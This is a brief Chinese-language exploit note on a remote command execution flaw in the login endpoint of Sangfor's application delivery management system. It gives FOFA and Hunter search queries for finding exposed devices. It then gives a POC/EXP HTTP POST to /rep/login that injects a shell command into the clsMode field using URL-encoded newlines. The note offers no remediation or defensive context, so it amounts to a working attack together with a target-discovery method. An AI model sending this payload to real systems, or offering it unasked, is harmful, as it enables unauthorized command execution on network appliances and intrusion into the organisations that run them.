# 深信服 应用交付管理系统 login 远程命令执行漏洞

## 网络测绘

fofa: app="SANGFOR-应用交付管理系统" || fid="iaytNA57019/kADk8Nev7g=="

hunter: app.name="SANGFOR 深信服应用交付报表系统"

## POC / EXP

```
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```